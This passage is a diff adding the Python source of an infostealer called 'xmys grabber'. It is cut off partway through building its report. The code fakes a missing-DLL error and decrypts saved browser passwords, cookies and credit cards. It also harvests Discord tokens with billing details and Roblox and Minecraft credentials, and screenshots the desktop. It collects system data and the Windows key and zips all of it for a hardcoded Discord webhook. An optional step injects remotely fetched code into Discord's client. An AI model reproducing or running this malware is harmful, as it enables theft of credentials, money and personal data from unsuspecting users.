@@ -1,0 +1,1246 @@
+_A2 = "wmic path win32_VideoController get name"
+_A1 = "\\\\Epic Privacy Browser\\\\User Data"
+_A0 = "\\\\Google\\\\Chrome SxS\\\\User Data"
+_z = "\\\\Sputnik\\\\Sputnik\\\\User Data"
+_y = "\\\\7Star\\\\7Star\\\\User Data"
+_x = "\\\\CentBrowser\\\\User Data"
+_w = "\\\\Orbitum\\\\User Data"
+_v = "\\\\Kometa\\\\User Data"
+_u = "\\\\Torch\\\\User Data"
+_t = "\\\\Amigo\\\\User Data"
+_s = "\\\\Opera Software\\\\Opera GX Stable"
+_r = "\\\\Opera Software\\\\Opera Stable"
+_q = "Chromium"
+_p = "Iridium"
+_o = "Chrome Beta"
+_n = "Vivaldi"
+_m = "Yandex"
+_l = "Chrome"
+_k = "error_message"
+_j = "black_screen"
+_i = "force_admin"
+_h = "antivm"
+_g = "hideconsole"
+_f = "inject"
+_e = "injection_url"
+_d = "keep-alive"
+_c = "persist"
+_b = "webhook"
+_a = "username"
+_Z = "cookies"
+_Y = "cards"
+_X = "addresses"
+_W = "phones"
+_V = "tokens"
+_U = "passwords"
+_T = "Epic Privacy Browser"
+_S = "Chrome SxS"
+_R = "Sputnik"
+_Q = "7Star"
+_P = "CentBrowser"
+_O = "Orbitum"
+_N = "Kometa"
+_M = "Torch"
+_L = "Amigo"
+_K = "Opera GX"
+_J = "Opera"
+_I = "\n"
+_H = "Default"
+_G = "utf8"
+_F = "ignore"
+_E = "w"
+_D = True
+_C = None
+_B = False
+_A = "N/A"
+import os, json, shutil, base64, sqlite3, zipfile, requests, subprocess, psutil, random, ctypes, sys, re, datetime, time, traceback
+from threading import Thread
+from PIL import ImageGrab
+from win32crypt import CryptUnprotectData
+from Crypto.Cipher import AES
+
+config = {
+    _b: "https://discord.com/api/webhooks/1346543707435827261/mpzC0WuBOC5fZDeA6I_lT_J2trMY5q2Eh8897P6sX151BMLRjua_uutne7Rrw2crgh-_",
+    _c: _B,
+    _d: _B,
+    _e: "",
+    _f: _B,
+    _g: _D,
+    _h: _D,
+    _i: _B,
+    _j: _B,
+    "error": _D,
+    _k: "This application failed to start because MSCVDLL.dll is missing.\n\nPlease download the latest version of Microsoft C++ Compiler and try again.",
+}
+
+
+def update(args):
+    for C in args:
+        B, A = C.split("=")
+        if B in config:
+            config[B] = (
+                json.loads(A) if A.lower() in ["true", "false", "null"] or A.isdigit() else A
+            )
+        else:
+            raise KeyError(f"Key '{B}' does not exist in config.")
+
+
+class functions:
+    def getHeaders(C, token=_C, content_type="application/json"):
+        A = token
+        B = {
+            "Content-Type": content_type,
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
+        }
+        if A:
+            B.update({"Authorization": A})
+        return B
+
+    def get_master_key(D, path):
+        with open(path, "r", encoding="utf-8") as C:
+            B = C.read()
+        B = json.loads(B)
+        A = base64.b64decode(B["os_crypt"]["encrypted_key"])
+        A = A[5:]
+        A = CryptUnprotectData(A, _C, _C, _C, 0)[1]
+        return A
+
+    def decrypt_val(G, buff, master_key):
+        C = master_key
+        A = buff
+        try:
+            D = A[3:15]
+            E = A[15:]
+            F = AES.new(C, AES.MODE_GCM, D)
+            B = F.decrypt(E)
+            B = B[:-16].decode()
+            return B
+        except Exception:
+            return f'Failed to decrypt "{str(A)}" | Key: "{str(C)}"'
+
+    def fsize(E, path):
+        B = path
+        B = internal.tempfolder + os.sep + B
+        if os.path.isfile(B):
+            A = os.path.getsize(B) / 1024
+        else:
+            D = 0
+            with os.scandir(B) as F:
+                for C in F:
+                    if C.is_file():
+                        D += C.stat().st_size
+                    elif C.is_dir():
+                        D += E.fsize(C.path)
+            A = D / 1024
+        if A > 1024:
+            A = "{:.1f} MB".format(A / 1024)
+        else:
+            A = "{:.1f} KB".format(A)
+        return A
+
+    def gen_tree(H, path):
+        C = ""
+        F = 0
+        for A, K, G in os.walk(path):
+            B = A.replace(path, "")
+            B = B.count(os.sep)
+            D = "│ "
+            C += f"\n{D*B}📁 {os.path.basename(A)}/"
+            for I, E in enumerate(G):
+                if E == f"xmys-{os.getlogin()}.zip":
+                    continue
+                J = D if I != len(G) - 1 else "└ "
+                C += f"\n{D*B}{J}{E} ({H.fsize((os.path.basename(A)+os.sep if A.split(os.sep)[-1]!=internal.tempfolder.split(os.sep)[-1]else'')+E)})"
+                F += 1
+        return C, F
+
+    def system(A, action):
+        return _I.join(
+            A
+            for A in subprocess.check_output(action, creationflags=134217728, shell=_D)
+            .decode()
+            .strip()
+            .splitlines()
+            if A.strip()
+        )
+
+
+class internal:
+    tempfolder = _C
+    stolen = _B
+
+
+class ticks(functions, internal):
+    def __init__(A, useless):
+        B = "userprofile"
+        del useless
+        if config.get("error"):
+            Thread(
+                target=ctypes.windll.user32.MessageBoxW,
+                args=(0, config.get(_k), os.path.basename(sys.argv[0]), 1 | 16),
+            ).start()
+        try:
+            E = ctypes.windll.shell32.IsUserAnAdmin()
+        except Exception:
+            E = _B
+        if not E and config[_i] and "--nouacbypass" not in sys.argv:
+            A.forceadmin()
+        A.webhook = config.get(_b)
+        A.exceptions = []
+        A.baseurl = "https://discord.com/api/v9/users/@me"
+        A.appdata = os.getenv("localappdata")
+        A.roaming = os.getenv("appdata")
+        G = [
+            A.appdata,
+            A.roaming,
+            os.getenv("temp"),
+            "C:\\Users\\Public\\Public Music",
+            "C:\\Users\\Public\\Public Pictures",
+            "C:\\Users\\Public\\Public Videos",
+            "C:\\Users\\Public\\Public Documents",
+            "C:\\Users\\Public\\Public Downloads",
+            os.getenv(B),
+            os.getenv(B) + "\\Documents",
+            os.getenv(B) + "\\Music",
+            os.getenv(B) + "\\Pictures",
+            os.getenv(B) + "\\Videos",
+        ]
+        while _D:
+            F = random.choice(G)
+            if os.path.exists(F):
+                A.tempfolder = os.path.join(
+                    F,
+                    "".join(
+                        random.choices(
+                            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890", k=8
+                        )
+                    ),
+                )
+                break
+        internal.tempfolder = A.tempfolder
+        A.browserpaths = {
+            _J: A.roaming + _r,
+            _K: A.roaming + _s,
+            "Edge": A.appdata + "\\\\Microsoft\\\\Edge\\\\User Data",
+            _l: A.appdata + "\\\\Google\\\\Chrome\\\\User Data",
+            _m: A.appdata + "\\\\Yandex\\\\YandexBrowser\\\\User Data",
+            "Brave": A.appdata + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data",
+            _L: A.appdata + _t,
+            _M: A.appdata + _u,
+            _N: A.appdata + _v,
+            _O: A.appdata + _w,
+            _P: A.appdata + _x,
+            _Q: A.appdata + _y,
+            _R: A.appdata + _z,
+            _S: A.appdata + _A0,
+            _T: A.appdata + _A1,
+            _n: A.appdata + "\\\\Vivaldi\\\\User Data",
+            _o: A.appdata + "\\\\Google\\\\Chrome Beta\\\\User Data",
+            "Uran": A.appdata + "\\\\uCozMedia\\\\Uran\\\\User Data",
+            _p: A.appdata + "\\\\Iridium\\\\User Data",
+            _q: A.appdata + "\\\\Chromium\\\\User Data",
+        }
+        A.stats = {_U: 0, _V: 0, _W: 0, _X: 0, _Y: 0, _Z: 0}
+        try:
+            os.makedirs(os.path.join(A.tempfolder), 493, exist_ok=_D)
+            ctypes.windll.kernel32.SetFileAttributesW(A.tempfolder, 2)
+            ctypes.windll.kernel32.SetFileAttributesW(A.tempfolder, 4)
+            ctypes.windll.kernel32.SetFileAttributesW(A.tempfolder, 598)
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+        os.chdir(A.tempfolder)
+        if config.get(_c) and not A.stolen:
+            Thread(target=A.persist).start()
+        if config.get(_f):
+            Thread(target=A.injector).start()
+        A.tokens = []
+        A.robloxcookies = []
+        A.files = ""
+        C = [
+            Thread(target=A.screenshot),
+            Thread(target=A.grabMinecraftCache),
+            Thread(target=A.tokenRun),
+            Thread(target=A.grabRobloxCookie),
+            Thread(target=A.getSysInfo),
+        ]
+        for H, I in A.browserpaths.items():
+            C.append(Thread(target=A.grabBrowserInfo, args=(H, I)))
+        for D in C:
+            D.start()
+        for D in C:
+            D.join()
+        if A.exceptions:
+            with open(A.tempfolder + "\\errors.txt", _E, encoding="utf-8") as J:
+                J.write(_I.join(A.exceptions))
+        A.SendInfo()
+        shutil.rmtree(A.tempfolder)
+        if config.get(_j):
+            A.system("start ms-cxh-full://0")
+
+    def tokenRun(A):
+        A.grabTokens()
+        A.neatifyTokens()
+
+    def getSysInfo(A):
+        with open(A.tempfolder + f"\\specs.txt", _E, encoding=_G, errors=_F) as W:
+            try:
+                D = A.system("wmic cpu get name").splitlines()[1]
+            except Exception:
+                D = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                E = A.system(_A2).splitlines()[1]
+            except Exception:
+                E = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                F = f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}"
+            except Exception:
+                F = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                G = A.system("wmic path win32_VideoController get currentrefreshrate").splitlines()[
+                    1
+                ]
+            except Exception:
+                G = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                H = "Windows " + A.system("wmic os get version").splitlines()[1]
+            except Exception:
+                H = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                I = A.system("wmic systemslot get slotdesignation,currentusage,description,status")
+            except Exception:
+                I = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                J = A.system("tasklist")
+            except Exception:
+                J = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                K = _I.join(
+                    A.system(
+                        "powershell Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* ^| Select-Object DisplayName"
+                    ).splitlines()[3:]
+                )
+            except Exception:
+                K = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                L = A.system("set").replace("=", " = ")
+            except Exception:
+                L = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                M = A.system("wmic bios get manufacturer").splitlines()[1]
+            except Exception:
+                M = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                N = A.system("wmic csproduct get name").splitlines()[1]
+            except Exception:
+                N = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                O = A.system("wmic csproduct get uuid").splitlines()[1]
+            except Exception:
+                O = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                P = ", ".join(
+                    A.system(
+                        "wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayname"
+                    ).splitlines()[1:]
+                )
+            except Exception:
+                P = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                Q = os.getlogin()
+            except Exception:
+                Q = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                R = A.system("hostname")
+            except Exception:
+                R = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                C = A.getProductValues()
+            except Exception:
+                C = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                S = C[0]
+            except Exception:
+                S = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                T = C[1]
+            except Exception:
+                T = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                U = str(psutil.virtual_memory()[0] / 1024**3).split(".")[0]
+            except Exception:
+                U = _A
+                A.exceptions.append(traceback.format_exc())
+            try:
+                V = str(psutil.disk_usage("/")[0] / 1024**3).split(".")[0]
+            except Exception:
+                V = _A
+                A.exceptions.append(traceback.format_exc())
+            B = "=" * 40
+            W.write(
+                f"""{B}
+                HARDWARE 
+{B}
+CPU: {D}
+GPU: {E}
+RAM: {U} GB
+Disk Size: {V} GB
+PC Manufacturer: {M}
+Model Name: {N}
+Screen Info:
+Resolution: {F}
+Refresh Rate: {G}Hz
+System Slots:
+{I}
+{B}
+                   OS
+{B}
+Username: {Q}
+PC Name: {R}
+Build Name: {H}
+Edition: {S}
+Windows Key: {T}
+HWID: {O}
+Antivirus: {P}
+{B}
+                  PATH
+{B}
+{L}
+{B}
+             INSTALLED APPS
+{B}
+{K}
+{B}
+            RUNNING PROCESSES
+{B}
+{J}
+"""
+            )
+
+    def checkToken(A, tkn, source):
+        B = tkn
+        try:
+            C = requests.get(A.baseurl, headers=A.getHeaders(B))
+            if C.status_code == 200 and B not in [A[0] for A in A.tokens]:
+                A.tokens.append((B, source))
+                A.stats[_V] += 1
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+
+    def bypassBetterDiscord(C):
+        A = C.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
+        if os.path.exists(A):
+            with open(A, "r", encoding=_G, errors=_F) as B:
+                D = B.read()
+                E = D.replace("api/webhooks", "api/nethooks")
+            with open(A, _E, newline="", encoding=_G, errors=_F) as B:
+                B.write(E)
+
+    def grabBrowserInfo(A, platform, path):
+        Q = "\\Local State"
+        D = path
+        B = platform
+        if os.path.exists(D):
+            A.passwords_temp = (
+                A.cookies_temp
+            ) = A.history_temp = A.misc_temp = A.formatted_cookies = ""
+            F = "=" * 40
+            G = lambda x: f"\\{B}({x}).txt"
+            R = (
+                lambda p, c, h, m: f"""Browser: {B}
+
+{F}
+               PASSWORDS
+{F}
+
+{p}
+{F}
+                COOKIES
+{F}
+
+{c}
+{F}
+                HISTORY
+{F}
+
+{h}
+{F}
+               OTHER INFO
+{F}
+
+{m}"""
+            )
+            N = [_H]
+            for dir in os.listdir(D):
+                if dir.startswith("Profile ") and os.path.isdir(dir):
+                    N.append(dir)
+            if B in [_J, _K, _L, _M, _N, _O, _P, _Q, _R, _S, _T]:
+                J = D + "\\Network\\Cookies"
+                K = D + "\\Login Data"
+                L = D + "\\History"
+                M = D + "\\Web Data"
+                C = D + Q
+                G = f"\\{B}.txt"
+                I = [
+                    Thread(target=A.grabPasswords, args=[C, B, _H, K]),
+                    Thread(target=A.grabCookies, args=[C, B, _H, J]),
+                    Thread(target=A.grabHistory, args=[C, B, _H, L]),
+                    Thread(target=A.grabMisc, args=[C, B, _H, M]),
+                ]
+                for H in I:
+                    H.start()
+                for H in I:
+                    H.join()
+                try:
+                    A.grabPasswords(C, G, K)
+                    A.grabCookies(C, G, J)
+                    A.grabHistory(C, G, L)
+                    A.grabMisc(C, G, M)
+                except Exception:
+                    A.exceptions.append(traceback.format_exc())
+            else:
+                for E in N:
+                    J = D + f"\\{E}\\Network\\Cookies"
+                    K = D + f"\\{E}\\Login Data"
+                    L = D + f"\\{E}\\History"
+                    M = D + f"\\{E}\\Web Data"
+                    C = D + Q
+                    G = f"\\{B} ({E}).txt"
+                    I = [
+                        Thread(target=A.grabPasswords, args=[C, B, E, K]),
+                        Thread(target=A.grabCookies, args=[C, B, E, J]),
+                        Thread(target=A.grabHistory, args=[C, B, E, L]),
+                        Thread(target=A.grabMisc, args=[C, B, E, M]),
+                    ]
+                    for H in I:
+                        H.start()
+                    for H in I:
+                        H.join()
+            with open(
+                A.tempfolder + f"\\{B} cookies ({E}).txt", _E, encoding=_G, errors=_F
+            ) as O, open(A.tempfolder + G, _E, encoding=_G, errors=_F) as P:
+                if A.formatted_cookies:
+                    O.write(A.formatted_cookies)
+                else:
+                    O.close()
+                    os.remove(A.tempfolder + f"\\{B} cookies ({E}).txt")
+                if A.passwords_temp or A.cookies_temp or A.history_temp or A.misc_temp:
+                    P.write(R(A.passwords_temp, A.cookies_temp, A.history_temp, A.misc_temp))
+                else:
+                    P.close()
+                    os.remove(A.tempfolder + G)
+
+    def injector(A):
+        A.bypassBetterDiscord()
+        for dir in os.listdir(A.appdata):
+            if "discord" in dir.lower():
+                B = A.appdata + f"\\{dir}"
+                G = B + "\\"
+                for C in os.listdir(os.path.abspath(B)):
+                    if re.match("app-(\\d*\\.\\d*)*", C):
+                        D = os.path.abspath(G + C)
+                        for E in os.listdir(os.path.join(D, "modules")):
+                            if E.startswith("discord_desktop_core-"):
+                                F = D + f"\\modules\\{E}\\discord_desktop_core\\"
+                                if os.path.exists(F):
+                                    H = requests.get(config.get(_e)).text.replace(
+                                        "%WEBHOOK%", A.webhook
+                                    )
+                                    with open(F + "index.js", _E, errors=_F) as I:
+                                        I.write(H)
+
+    def getProductValues(A):
+        try:
+            B = A.system(
+                "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
+            )
+        except Exception:
+            B = _A
+        try:
+            C = A.system(
+                "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"
+            )
+        except Exception:
+            C = _A
+        return [C, B]
+
+    def grabPasswords(A, mkp, bname, pname, data):
+        A.passwords_temp = ""
+        B = os.path.join(A.tempfolder, f"{bname}_{pname}_PASSWORDS.db".replace(" ", "_"))
+        G = A.get_master_key(mkp)
+        H = data
+        try:
+            shutil.copy2(H, B)
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+        E = sqlite3.connect(B)
+        C = E.cursor()
+        try:
+            C.execute("SELECT action_url, username_value, password_value FROM logins")
+            for D in C.fetchall():
+                F = D[0]
+                I = D[1]
+                J = D[2]
+                K = A.decrypt_val(J, G)
+                if F != "":
+                    A.passwords_temp += f"\nDomain: {F}\nUser: {I}\nPass: {K}\n"
+                    A.stats[_U] += 1
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+        C.close()
+        E.close()
+        try:
+            os.remove(B)
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+
+    def grabCookies(A, mkp, bname, pname, data):
+        A.cookies_temp = ""
+        A.formatted_cookies = ""
+        C = os.path.join(A.tempfolder, f"{bname}_{pname}_COOKIES.db".replace(" ", "_"))
+        I = A.get_master_key(mkp)
+        J = data
+        try:
+            shutil.copy2(J, C)
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+        G = sqlite3.connect(C)
+        D = G.cursor()
+        try:
+            D.execute("SELECT host_key, name, encrypted_value FROM cookies")
+            for E in D.fetchall():
+                F = E[0]
+                H = E[1]
+                B = A.decrypt_val(E[2], I)
+                if F != "":
+                    A.cookies_temp += f"\nHost: {F}\nUser: {H}\nCookie: {B}\n"
+                    A.formatted_cookies += f"{F}\tTRUE\t/\tFALSE\t1708726694\t{H}\t{B}\n"
+                    A.stats[_Z] += 1
+                if (
+                    "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
+                    in B
+                ):
+                    A.robloxcookies.append(B)
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+        D.close()
+        G.close()
+        try:
+            os.remove(C)
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+
+    def grabHistory(A, mkp, bname, pname, data):
+        A.history_temp = ""
+        C = os.path.join(A.tempfolder, f"{bname}_{pname}_HISTORY.db".replace(" ", "_"))
+        G = data
+        try:
+            shutil.copy2(G, C)
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+        E = sqlite3.connect(C)
+        D = E.cursor()
+        try:
+            D.execute("SELECT title, url, visit_count, last_visit_time FROM urls")
+            for B in D.fetchall()[::-1]:
+                H = B[0]
+                F = B[1]
+                I = B[2]
+                J = B[3]
+                K = str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=J))[
+                    :-7
+                ].replace("-", "/")
+                if F != "":
+                    A.history_temp += f"""
+URL: {H}
+Title: {F}
+Visit Count: {I}
+Last Visited: {K}
+"""
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+        D.close()
+        E.close()
+        try:
+            os.remove(C)
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+
+    def grabMisc(A, mkp, bname, pname, data):
+        A.misc_temp = ""
+        D = os.path.join(A.tempfolder, f"{bname}_{pname}_WEBDATA.db".replace(" ", "_"))
+        I = A.get_master_key(mkp)
+        J = data
+        try:
+            shutil.copy2(J, D)
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+        E = sqlite3.connect(D)
+        C = E.cursor()
+        try:
+            C.execute("SELECT street_address, city, state, zipcode FROM autofill_profiles")
+            for B in C.fetchall():
+                F = B[0]
+                K = B[1]
+                L = B[2]
+                M = B[3]
+                if F != "":
+                    A.misc_temp += f"""
+Address: {F}
+City: {K}
+State: {L}
+ZIP Code: {M}
+"""
+                    A.stats[_X] += 1
+            C.execute("SELECT number FROM autofill_profile_phones")
+            for B in C.fetchall():
+                G = B[0]
+                if G != "":
+                    A.misc_temp += f"\nPhone Number: {G}\n"
+                    A.stats[_W] += 1
+            C.execute(
+                "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
+            )
+            for B in C.fetchall():
+                N = B[0]
+                O = B[1]
+                P = B[2]
+                H = A.decrypt_val(B[3], I)
+                if H != "":
+                    A.misc_temp += f"""
+Card Number: {H}
+Name on Card: {N}
+Expiration Month: {O}
+Expiration Year: {P}
+"""
+                    A.stats[_Y] += 1
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+        C.close()
+        E.close()
+        try:
+            os.remove(D)
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+
+    def grabRobloxCookie(A):
+        try:
+            A.robloxcookies.append(
+                A.system(
+                    "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com' -Name .ROBLOSECURITY"
+                )
+            )
+        except Exception:
+            pass
+        if A.robloxcookies:
+            with open(A.tempfolder + "\\roblox cookies.txt", _E) as B:
+                for C in A.robloxcookies:
+                    B.write(C + _I)
+
+    def grabTokens(A):
+        O = "\\Mozilla\\Firefox\\Profiles"
+        N = "\\discord\\Local State"
+        M = ".ldb"
+        L = ".log"
+        F = "<PROFILE>"
+        P = {
+            "Discord": A.roaming + "\\\\discord\\\\Local Storage\\\\leveldb\\\\",
+            "Discord Canary": A.roaming + "\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\",
+            "Lightcord": A.roaming + "\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\",
+            "Discord PTB": A.roaming + "\\\\discordptb\\\\Local Storage\\\\leveldb\\\\",
+            _J: A.roaming + _r,
+            _K: A.roaming + _s,
+            _L: A.appdata + _t,
+            _M: A.appdata + _u,
+            _N: A.appdata + _v,
+            _O: A.appdata + _w,
+            _P: A.appdata + _x,
+            _Q: A.appdata + _y,
+            _R: A.appdata + _z,
+            _S: A.appdata + _A0,
+            _T: A.appdata + _A1,
+            _n: A.appdata + "\\\\Vivaldi\\\\User Data\\\\<PROFILE>",
+            _l: A.appdata + "\\\\Google\\\\Chrome\\\\User Data\\\\<PROFILE>",
+            _o: A.appdata + "\\\\Google\\\\Chrome Beta\\\\User Data\\\\<PROFILE>",
+            "Edge": A.appdata + "\\\\Microsoft\\\\Edge\\\\User Data\\\\<PROFILE>",
+            "Uran": A.appdata + "\\\\uCozMedia\\\\Uran\\\\User Data\\\\<PROFILE>",
+            _m: A.appdata + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\<PROFILE>",
+            "Brave": A.appdata + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\<PROFILE>",
+            _p: A.appdata + "\\\\Iridium\\\\User Data\\\\<PROFILE>",
+            _q: A.appdata + "\\\\Chromium\\\\User Data\\\\<PROFILE>",
+        }
+        for G, B in P.items():
+            if not os.path.exists(B.replace(F, "")):
+                continue
+            if "discord" not in B:
+                H = [_H]
+                for dir in os.listdir(B.replace(F, "")):
+                    if dir.startswith("Profile "):
+                        H.append(dir)
+                for I in H:
+                    J = B.replace(F, I) + "\\\\Local Storage\\\\leveldb\\\\"
+                    for C in os.listdir(J):
+                        if not C.endswith(L) and not C.endswith(M):
+                            continue
+                        for D in [
+                            A.strip() for A in open(f"{J}\\{C}", errors=_F).readlines() if A.strip()
+                        ]:
+                            for E in re.findall("[\\w-]{24,28}\\.[\\w-]{6}\\.[\\w-]{25,110}", D):
+                                A.checkToken(E, f"{G} ({I})")
+            elif os.path.exists(A.roaming + N):
+                for C in os.listdir(B):
+                    if not C.endswith(L) and not C.endswith(M):
+                        continue
+                    for D in [
+                        A.strip() for A in open(f"{B}\\{C}", errors=_F).readlines() if A.strip()
+                    ]:
+                        for Q in re.findall('dQw4w9WgXcQ:[^\\"]*', D):
+                            E = A.decrypt_val(
+                                base64.b64decode(Q.split("dQw4w9WgXcQ:")[1]),
+                                A.get_master_key(A.roaming + N),
+                            )
+                            A.checkToken(E, G)
+        if os.path.exists(A.roaming + O):
+            for B, S, R in os.walk(A.roaming + O):
+                for K in R:
+                    if not K.endswith(".sqlite"):
+                        continue
+                    for D in [
+                        A.strip() for A in open(f"{B}\\{K}", errors=_F).readlines() if A.strip()
+                    ]:
+                        for E in re.findall("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}", D):
+                            A.checkToken(E, "Firefox")
+
+    def neatifyTokens(B):
+        I = "phone"
+        E = open(B.tempfolder + "\\tokens.txt", "w+", encoding=_G, errors=_F)
+        for G in B.tokens:
+            F = G[0]
+            D = requests.get(B.baseurl, headers=B.getHeaders(F)).json()
+            J = D.get(_a) + "#" + str(D.get("discriminator"))
+            A = ""
+            C = D["flags"]
+            if C == 1:
+                A += "Staff, "
+            if C == 2:
+                A += "Partner, "
+            if C == 4:
+                A += "Hypesquad Event, "
+            if C == 8:
+                A += "Green Bughunter, "
+            if C == 64:
+                A += "Hypesquad Bravery, "
+            if C == 128:
+                A += "HypeSquad Brillance, "
+            if C == 256:
+                A += "HypeSquad Balance, "
+            if C == 512:
+                A += "Early Supporter, "
+            if C == 16384:
+                A += "Gold BugHunter, "
+            if C == 131072:
+                A += "Verified Bot Developer, "
+            if A == "":
+                A = "None"
+            K = D.get("email")
+            L = D.get(I) if D.get(I) else "No Phone Number attached"
+            try:
+                M = requests.get(
+                    B.baseurl + "/billing/subscriptions", headers=B.getHeaders(F)
+                ).json()
+            except Exception:
+                B.exceptions.append(traceback.format_exc())
+            H = _B
+            H = bool(len(M) > 0)
+            try:
+                N = bool(
+                    len(
+                        json.loads(
+                            requests.get(
+                                B.baseurl + "/billing/payment-sources", headers=B.getHeaders(F)
+                            ).text
+                        )
+                    )
+                    > 0
+                )
+            except Exception:
+                B.exceptions.append(traceback.format_exc())
+            E.write(
+                f"""{" "*17}{J}
+{"-"*50}
+Token: {F}
+Platform: {G[1]}
+Has Billing: {N}
+Nitro: {H}
+Badges: {A}
+Email: {K}
+Phone: {L}
+
+"""
+            )
+        E.seek(0)
+        O = E.read()
+        E.close()
+        if not O:
+            os.remove(B.tempfolder + "\\discord info.txt")
+
+    def screenshot(B):
+        A = ImageGrab.grab(bbox=_C, include_layered_windows=_B, all_screens=_D, xdisplay=_C)
+        A.save(B.tempfolder + "\\Screenshot.png")
+        A.close()
+
+    def grabMinecraftCache(A):
+        E = ".minecraft"
+        if not os.path.exists(os.path.join(A.roaming, E)):
+            return
+        C = os.path.join(A.tempfolder, "Minecraft Cache")
+        os.makedirs(C, exist_ok=_D)
+        D = os.path.join(A.roaming, E)
+        F = [
+            "launcher_accounts.json",
+            "launcher_profiles.json",
+            "usercache.json",
+            "launcher_log.txt",
+        ]
+        for B in F:
+            if os.path.exists(os.path.join(D, B)):
+                shutil.copy2(os.path.join(D, B), C + os.sep + B)
+
+    def SendInfo(A):
+        Y = "data"
+        X = "upload_file"
+        W = "description"
+        V = "xmys grabber"
+        U = "avatar_url"
+        T = "content"
+        H = "https://cdn.discordapp.com/attachments/1297218588800716871/1303848816151232533/SomnusTheMystic.png?ex=672d3f56&is=672bedd6&hm=55fe5eabd59f78df43c263d92d33b6a0d9d219a7d6b2c4d6328a0f7e30fed85d&"
+        E = "inline"
+        D = "value"
+        C = "name"
+        Z = A.getProductValues()[0]
+        I = A.getProductValues()[1]
+        J = K = L = M = N = "None"
+        try:
+            B = requests.get("https://ipinfo.io/json").json()
+            J = B["ip"]
+            L = B["city"]
+            K = B["country"]
+            M = B["region"]
+            N = "https://www.google.com/maps/search/google+map++" + B["loc"]
+        except Exception:
+            A.exceptions.append(traceback.format_exc())
+        F = os.path.join(A.tempfolder, f"xmys-{os.getlogin()}.zip")
+        O = zipfile.ZipFile(F, _E, zipfile.ZIP_DEFLATED)
+        a = os.path.abspath(A.tempfolder)
+        for b, h, c in os.walk(A.tempfolder):
+            for P in c:
+                if P == f"xmys-{os.getlogin()}.zip":
+                    continue
+                Q = os.path.abspath(os.path.join(b, P))
+                d = Q[len(a) + 1 :]
+                O.write(Q, d)
+        O.close()
+        A.files, A.fileCount = A.gen_tree(A.tempfolder)
+        A.fileCount = f"{A.fileCount} File{'s'if A.fileCount!=1 else''} Found: "
+        e = {
+            _a: V,
+            T: "@everyone",
+            U: H,
+            "embeds": [
+                {
+                    "title": "System Information",
+                    W: f"**{os.getlogin()}** - **Computer Name**: {os.getenv('COMPUTERNAME')}",
+                    "color": 3092790,
+                    "fields": [
+                        {
+                            C: "📍 **Location**",
+                            D: f"**IP**: {J}\n**City**: {L}\n**Region**: {M}\n**Country**: {K}\n[Google Maps Location]({N})",
+                            E: _B,
+                        },
+                        {
+                            C: "🔑 **Product Information**",
+                            D: f"**{Z}**: {I if I else'No Product Key!'}",
+                            E: _B,
+                        },
+                        {
+                            C: "🔒 **Stats**",
+                            D: f"""**Passwords Found**: {A.stats[_U]}
+**Cookies Found**: {A.stats[_Z]}
+**Phones Found**: {A.stats[_W]}
+**Cards Found**: {A.stats[_Y]}
+**Addresses Found**: {A.stats[_X]}
+**Tokens Found**: {A.stats[_V]}""",
+                            E: _B,
+                        },
+                        {
+                            C: "📂 **File Info**",
+                            D: f"**Files**: `{A.fileCount}`\n**File List**: ```ansi\n[32m{A.files}```",
